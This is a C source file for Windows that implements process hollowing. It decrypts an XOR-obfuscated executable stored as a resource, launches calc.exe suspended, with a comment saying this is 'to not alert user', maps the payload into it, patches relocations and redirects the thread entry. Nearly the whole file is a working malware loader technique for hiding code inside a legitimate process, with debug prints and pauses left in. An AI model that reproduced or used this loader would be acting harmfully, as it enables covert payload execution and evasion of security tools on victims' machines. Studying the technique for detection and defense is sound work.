#define UMDF_USING_NTSTATUS
#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <stdio.h>

#pragma comment(lib, "ntdll")

void XORBACK(char *Data, int sz) {
   char Key[] = "EncryptionKey";
   for (int i = 0; i < sz; i++)
      Data[i] = Data[i] ^ Key[i % strlen(Key)];
}

int ProcessHollow(char *binary)
{
	STARTUPINFO					si;
    PROCESS_INFORMATION			pi;
	PROCESS_BASIC_INFORMATION	pbi;
	void 						*image_base = NULL;
	void						*new_image_tracker;
	char						*new_image_base;

    ZeroMemory( &si, sizeof(si) );
	ZeroMemory( &pi, sizeof(pi) );
	si.cb = sizeof(si);
	
	if (CreateProcessA(NULL, "calc.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi) == 0 )
	{
		printf("Failed creating process.");
		return -1;
	} // it's not possible to run an empty process, so we choose calc in suspended mode (to not alert user)
	NtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(PROCESS_BASIC_INFORMATION), 0);
	printf("pid: %d\n", pi.dwProcessId);
	if (ReadProcessMemory(pi.hProcess, 	(char *)(pbi.PebBaseAddress) + 0x10, &image_base, sizeof(void *), NULL) == 0)
	{
		printf("Failed querying for the PEB.");
		return -2;
	}		
	printf("image_base %p\n", image_base);

/*	if (NtUnmapViewOfSection(pi.hProcess, image_base) != STATUS_SUCCESS)
	{
		printf("image_base %p\n", image_base);
		printf("Failed carving out the process memory.\n");
	//	return -3;
	}
*/
	if (((PIMAGE_DOS_HEADER) binary)->e_magic != 0x5A4D )
   	{
		printf("Dos header not found. There must be an error.");
    	return -4;
	}
	PIMAGE_NT_HEADERS		nt_header = (PIMAGE_NT_HEADERS) (binary + ((PIMAGE_DOS_HEADER) binary)->e_lfanew) ;
	
/*if (nt_header->Signature != 0x50450000)
	{
		printf("signature %x\n", nt_header->Signature);
		printf("Failed identifying the NT header.");
		return -5;
	}
*/
	DWORD		image_entry = nt_header->OptionalHeader.AddressOfEntryPoint;
	printf("%x\n", image_entry);
	DWORD		size_of_file = nt_header->OptionalHeader.SizeOfImage;			// useful for copy
	DWORD		size_of_heads = nt_header->OptionalHeader.SizeOfHeaders;		// useful for copy

   	new_image_base = VirtualAllocEx(pi.hProcess, 0, size_of_file, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (new_image_base == NULL)
	{
		printf("Failed allocating memory for the new process.");
		return -6;
	}
	ULONGLONG exe_image_base = nt_header->OptionalHeader.ImageBase;
	nt_header->OptionalHeader.ImageBase = (ULONGLONG) new_image_base;
	if (WriteProcessMemory(pi.hProcess, new_image_base, binary, size_of_heads, 0) == 0)
	{
		printf("Failed writing the headers");
		return -7;
	}
	printf("entry: %p\n", new_image_base + image_entry);
	getchar();
	IMAGE_SECTION_HEADER *sections = (IMAGE_SECTION_HEADER *) (nt_header + 1); // sections headers are located right after the NT header, thus +1.
	PIMAGE_BASE_RELOCATION reloc_section;
	for(int i = 0; i < nt_header->FileHeader.NumberOfSections; i++)
	{
		if(sections[i].VirtualAddress == nt_header->OptionalHeader.DataDirectory[5].VirtualAddress)
		{
			reloc_section = (PIMAGE_BASE_RELOCATION)(binary + sections[i].PointerToRawData);
		}
		if (WriteProcessMemory(pi.hProcess, new_image_base + sections[i].VirtualAddress, 
				binary +  sections[i].PointerToRawData, sections[i].SizeOfRawData, 0) == 0)
		{
			printf("Failed writing some section(s).");
			return -8;
		}
	}
	PWORD 	pointer_to_block;
	char	*to_be_patched;
	for(; reloc_section->VirtualAddress != 0; reloc_section = (PIMAGE_BASE_RELOCATION) ((char *) reloc_section + reloc_section->SizeOfBlock))
	{
		//printf reloc_section
		pointer_to_block = (PWORD) (reloc_section + 1);
		printf("check, patching area %p\n", new_image_base + reloc_section->VirtualAddress);
		getchar();
		for(; pointer_to_block < (PWORD)((char *) reloc_section + reloc_section->SizeOfBlock) ; pointer_to_block++)
		{
			if(!((*pointer_to_block) & 0xF000))
				continue;
			if (ReadProcessMemory(pi.hProcess, ((*pointer_to_block) & 0x0FFF ) + new_image_base + reloc_section->VirtualAddress,
				 &to_be_patched, sizeof(LPVOID), NULL) == 0)
			{
				printf("Failed reading a section for relocation.");
				return -9;
			}
			to_be_patched += new_image_base - (char *)exe_image_base;
			printf("Patched: %p at %p\n", to_be_patched, ((*pointer_to_block) & 0x0FFF ) + new_image_base + reloc_section->VirtualAddress);
			if (WriteProcessMemory(pi.hProcess, ((*pointer_to_block) & 0x0FFF ) + new_image_base + reloc_section->VirtualAddress, 
				&to_be_patched, sizeof(LPVOID), NULL) == 0)
			{
				printf("Failed patching relocation section(s).");
				return -10;
			}
		}
	}
	getchar();
	DWORD protection_vp;
	DWORD protection_old;
	for(int i = 0; i < nt_header->FileHeader.NumberOfSections; i++)
	{ 	
		if (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) // all sections have a read protection, otherwise they are useless
			protection_vp = sections[i].Characteristics & IMAGE_SCN_MEM_WRITE ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
		else
			protection_vp = sections[i].Characteristics & IMAGE_SCN_MEM_WRITE ? PAGE_READWRITE : PAGE_READONLY;
		if (VirtualProtectEx(pi.hProcess, new_image_base + sections[i].VirtualAddress,
			sections[i].Misc.VirtualSize, protection_vp, &protection_old) == 0)
		{
			printf("Failed modifying permission for some section(s).");
			return -11;
		}
	}

	CONTEXT thread_context;
	thread_context.ContextFlags = CONTEXT_INTEGER;
	if (GetThreadContext(pi.hThread, &thread_context) == 0)
	{
		printf("Failed querying for thread context.");
		return -12;
	}
	thread_context.Rcx = (DWORD64) (new_image_base + image_entry);
	if (SetThreadContext(pi.hThread, &thread_context) == 0)
	{
		printf("Failedd setting thread context.");
		return -13;
	}
	if (ResumeThread(pi.hThread) == -1)
	{
		printf("Something is wrong with the crafted process.");
		return -14;
	}
	printf("end");
	return 0;
}

int main()
{
   	HRSRC rsrcsec = FindResourceA(0, "MYEXEC", RT_RCDATA);
   	if (rsrcsec == NULL)
	{
		printf("Failed finding resource.");
		return -1;
   	}
   	HGLOBAL rsrc = LoadResource(0, rsrcsec);
	if (rsrc == NULL)
   	{
		printf("Failed loading resource.");
		return -1;
   	}
  	void * binary = malloc(SizeofResource(0, rsrcsec));
 	if (binary == NULL)
 	{
		printf("Failed allocating memory.");
		return -2;
   	}
   memcpy(binary, LockResource(rsrc), SizeofResource(0, rsrcsec));
   XORBACK(binary, SizeofResource(0, rsrcsec));
   printf("binary %p\n", binary);
   getchar();
   ProcessHollow(binary);
   return 0;
}